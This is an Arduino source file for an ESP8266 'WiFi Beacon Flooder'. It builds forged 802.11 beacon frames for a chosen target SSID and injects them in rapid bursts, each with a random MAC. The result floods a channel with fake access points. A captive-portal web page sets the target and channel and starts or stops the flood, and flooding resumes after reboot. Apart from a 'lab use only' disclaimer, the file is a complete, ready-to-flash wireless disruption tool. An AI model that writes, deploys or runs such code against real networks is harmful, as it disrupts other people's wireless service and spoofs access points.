/*
 * Wemos D1 Mini Lite - WiFi Beacon Flooder
 *
 * FOR USE IN CONTROLLED LAB ENVIRONMENTS ONLY.
 *
 * Floods a target WiFi channel with 802.11 beacon frames for a chosen SSID.
 * Each beacon carries a fresh random locally-administered MAC address so
 * scanners see many distinct "access points" all advertising the same SSID,
 * saturating the beacon space on that channel.
 *
 * Configuration via built-in captive portal web UI — no router needed.
 */

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <EEPROM.h>

extern "C" {
  #include "user_interface.h"
  int wifi_send_pkt_freedom(uint8_t *buf, int len, bool sys_seq);
}

// ---------- tunables ----------
#define EEPROM_SIZE       128
#define DNS_PORT          53
#define SSID_MAX_LEN      32
#define BEACON_BUF_SIZE   100
#define BEACONS_PER_BURST 50   // raw frames injected per loop iteration

const char* CONFIG_AP_SSID = "WifiBroadcaster";  // open setup network

// ---------- globals ----------
DNSServer        dnsServer;
ESP8266WebServer server(80);

struct Config {
  char    target_ssid[SSID_MAX_LEN];
  uint8_t channel;
  bool    flooding;
  uint8_t magic;   // 0xAB = valid, anything else = first boot
};

Config  config;
uint8_t beacon_buf[BEACON_BUF_SIZE];
int     beacon_len = 0;

/*
 * Fixed portion of every beacon frame:
 *   24-byte 802.11 MAC header  +  12-byte beacon fixed fields  =  36 bytes
 *
 * SA  (source MAC)  lives at offsets [10-15]
 * BSSID             lives at offsets [16-21]
 * Both are overwritten with a fresh random MAC before each tx.
 */
const uint8_t BEACON_FIXED[36] = {
  // 802.11 MAC header
  0x80, 0x00,                          // Frame Control: management / beacon
  0x00, 0x00,                          // Duration
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // DA: broadcast
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA   — randomised per packet [10-15]
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID — same as SA           [16-21]
  0x00, 0x00,                          // Sequence Control
  // Beacon fixed fields
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
  0x64, 0x00,                          // Beacon Interval: 100 TUs (~102 ms)
  0x21, 0x04,                          // Capability Info: ESS + short preamble
};

// -------------------------------------------------------- beacon --

/*
 * Build the beacon template in beacon_buf.
 * Only needs to be called when target_ssid or channel changes.
 */
void prepareBeaconTemplate() {
  uint8_t ssid_len = strnlen(config.target_ssid, SSID_MAX_LEN);

  memcpy(beacon_buf, BEACON_FIXED, 36);

  int pos = 36;

  // Tag 0: SSID
  beacon_buf[pos++] = 0x00;
  beacon_buf[pos++] = ssid_len;
  memcpy(&beacon_buf[pos], config.target_ssid, ssid_len);
  pos += ssid_len;

  // Tag 1: Supported Rates  (1, 2, 5.5, 11, 18, 24, 36, 54 Mbps)
  beacon_buf[pos++] = 0x01;
  beacon_buf[pos++] = 0x08;
  beacon_buf[pos++] = 0x82;  // 1 Mbps  (basic)
  beacon_buf[pos++] = 0x84;  // 2 Mbps  (basic)
  beacon_buf[pos++] = 0x8b;  // 5.5 Mbps (basic)
  beacon_buf[pos++] = 0x96;  // 11 Mbps (basic)
  beacon_buf[pos++] = 0x24;  // 18 Mbps
  beacon_buf[pos++] = 0x30;  // 24 Mbps
  beacon_buf[pos++] = 0x48;  // 36 Mbps
  beacon_buf[pos++] = 0x6c;  // 54 Mbps

  // Tag 3: DS Parameter Set (declares which channel these beacons are on)
  beacon_buf[pos++] = 0x03;
  beacon_buf[pos++] = 0x01;
  beacon_buf[pos++] = config.channel;

  beacon_len = pos;
}

/*
 * Inject BEACONS_PER_BURST frames, each with a fresh random MAC.
 * Locally administered + unicast: MSB of first octet has bit1 set, bit0 clear.
 */
void sendBeaconBurst() {
  if (beacon_len == 0) return;
  for (int i = 0; i < BEACONS_PER_BURST; i++) {
    beacon_buf[10] = (random(256) & 0xfe) | 0x02;
    beacon_buf[11] = random(256);
    beacon_buf[12] = random(256);
    beacon_buf[13] = random(256);
    beacon_buf[14] = random(256);
    beacon_buf[15] = random(256);
    memcpy(&beacon_buf[16], &beacon_buf[10], 6);  // BSSID = SA
    wifi_send_pkt_freedom(beacon_buf, beacon_len, false);
  }
}

// ------------------------------------------------------- EEPROM --

void saveConfig() {
  EEPROM.put(0, config);
  EEPROM.commit();
}

void loadConfig() {
  EEPROM.get(0, config);
  if (config.magic != 0xAB) {
    strncpy(config.target_ssid, "TargetSSID", SSID_MAX_LEN);
    config.channel  = 6;
    config.flooding = false;
    config.magic    = 0xAB;
    saveConfig();
    Serial.println("First boot — defaults written to EEPROM");
  }
}

// ----------------------------------------------------- web server --

void handleStatus() {
  String json = "{";
  json += "\"flooding\":"  + String(config.flooding ? "true" : "false") + ",";
  json += "\"ssid\":\""    + String(config.target_ssid) + "\",";
  json += "\"channel\":"   + String(config.channel);
  json += "}";
  server.send(200, "application/json", json);
}

void handleSetConfig() {
  bool changed = false;

  if (server.hasArg("ssid")) {
    String s = server.arg("ssid");
    s.trim();
    if (s.length() > 0 && s.length() < SSID_MAX_LEN) {
      s.toCharArray(config.target_ssid, SSID_MAX_LEN);
      changed = true;
    }
  }

  if (server.hasArg("channel")) {
    int ch = server.arg("channel").toInt();
    if (ch >= 1 && ch <= 13) {
      config.channel = (uint8_t)ch;
      changed = true;
    }
  }

  if (changed) {
    saveConfig();
    prepareBeaconTemplate();
    // Restart softAP on the updated channel so raw frames go out on the right channel
    WiFi.softAP(CONFIG_AP_SSID, "", config.channel);
    Serial.println("Config updated — SSID: " + String(config.target_ssid)
                   + "  ch: " + String(config.channel));
  }

  server.send(200, "text/plain", "OK");
}

void handleToggle() {
  config.flooding = !config.flooding;
  saveConfig();

  if (config.flooding) {
    prepareBeaconTemplate();
    Serial.println("Flooding ON  — SSID: " + String(config.target_ssid)
                   + "  ch: " + String(config.channel));
  } else {
    Serial.println("Flooding OFF");
  }

  server.send(200, "text/plain", config.flooding ? "started" : "stopped");
}

void handleRoot() {
  String html = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>Beacon Flooder</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    * { box-sizing: border-box; }
    body { font-family: Arial, sans-serif; background: #1a1a2e; color: #eee; margin: 0; padding: 20px; }
    .card {
      background: #16213e; max-width: 480px; margin: 40px auto;
      padding: 30px; border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
    }
    h1 { color: #e94560; margin: 0 0 4px; font-size: 1.6rem; }
    .sub { color: #666; font-size: 0.78rem; margin-bottom: 24px; }
    .badge {
      display: inline-block; padding: 6px 18px; border-radius: 20px;
      font-weight: bold; font-size: 0.9rem; margin-bottom: 24px;
      transition: background 0.3s;
    }
    .badge.on  { background: #e94560; color: #fff; }
    .badge.off { background: #2a2a3e; color: #777; }
    label { display: block; margin-bottom: 5px; font-size: 0.82rem; color: #aaa; letter-spacing: .04em; }
    input[type=text], select {
      width: 100%; padding: 10px 12px; margin-bottom: 18px;
      border: 1px solid #0f3460; border-radius: 6px;
      background: #0f3460; color: #eee; font-size: 1rem;
    }
    .btn {
      width: 100%; padding: 13px; border: none; border-radius: 6px;
      font-size: 1rem; font-weight: bold; cursor: pointer; margin-top: 6px;
    }
    .btn-save   { background: #0f3460; color: #ccc; }
    .btn-toggle { background: #e94560; color: #fff; }
    .btn:hover  { filter: brightness(1.15); }
    .hint { font-size: 0.75rem; color: #555; margin-top: 20px; text-align: center; }
  </style>
</head>
<body>
  <div class="card">
    <h1>Beacon Flooder</h1>
    <div class="sub">Lab use only &mdash; controlled environment</div>

    <div id="badge" class="badge off">STOPPED</div>

    <label>TARGET SSID</label>
    <input type="text" id="ssid" maxlength="31" placeholder="SSID to flood">

    <label>CHANNEL</label>
    <select id="channel">
      <option>1</option><option>2</option><option>3</option><option>4</option>
      <option>5</option><option>6</option><option>7</option><option>8</option>
      <option>9</option><option>10</option><option>11</option><option>12</option>
      <option>13</option>
    </select>

    <button class="btn btn-save"   onclick="saveConfig()">Save Config</button>
    <button class="btn btn-toggle" id="toggleBtn" onclick="toggle()">Start Flooding</button>

    <div class="hint">Reconnect to <strong>WifiBroadcaster</strong> then visit 192.168.4.1 to reconfigure</div>
  </div>

  <script>
    function refresh() {
      fetch('/status').then(r => r.json()).then(d => {
        document.getElementById('ssid').value    = d.ssid;
        document.getElementById('channel').value = String(d.channel);
        const badge = document.getElementById('badge');
        const btn   = document.getElementById('toggleBtn');
        if (d.flooding) {
          badge.textContent = 'FLOODING'; badge.className = 'badge on';
          btn.textContent   = 'Stop Flooding';
        } else {
          badge.textContent = 'STOPPED';  badge.className = 'badge off';
          btn.textContent   = 'Start Flooding';
        }
      });
    }

    function saveConfig() {
      const body = 'ssid='     + encodeURIComponent(document.getElementById('ssid').value.trim())
                 + '&channel=' + document.getElementById('channel').value;
      fetch('/set_config', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body
      }).then(() => refresh());
    }

    function toggle() {
      fetch('/toggle', {method: 'POST'}).then(() => refresh());
    }

    setInterval(refresh, 2000);
    refresh();
  </script>
</body>
</html>
)rawliteral";

  server.send(200, "text/html", html);
}

void setupWebServer() {
  server.on("/",           HTTP_GET,  handleRoot);
  server.on("/status",     HTTP_GET,  handleStatus);
  server.on("/set_config", HTTP_POST, handleSetConfig);
  server.on("/toggle",     HTTP_POST, handleToggle);

  // Captive portal: redirect everything else to the config page
  server.onNotFound([]() {
    server.sendHeader("Location", "http://192.168.4.1/", true);
    server.send(302, "text/plain", "");
  });
}

// -------------------------------------------------- setup / loop --

void setup() {
  Serial.begin(115200);
  randomSeed(micros());
  delay(100);
  Serial.println("\n\nBeacon Flooder starting...");

  EEPROM.begin(EEPROM_SIZE);
  loadConfig();

  // Pure AP mode on the configured channel — no router connection
  WiFi.mode(WIFI_AP);
  WiFi.softAP(CONFIG_AP_SSID, "", config.channel);

  Serial.println("Config AP : " + String(CONFIG_AP_SSID) + "  ch: " + String(config.channel));
  Serial.println("UI        : http://192.168.4.1");
  Serial.println("Target    : " + String(config.target_ssid));

  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
  setupWebServer();
  server.begin();

  prepareBeaconTemplate();

  if (config.flooding) {
    Serial.println("Resuming flood on boot");
  }
}

void loop() {
  if (config.flooding && beacon_len > 0) {
    sendBeaconBurst();
  }
  dnsServer.processNextRequest();
  server.handleClient();
  yield();
}
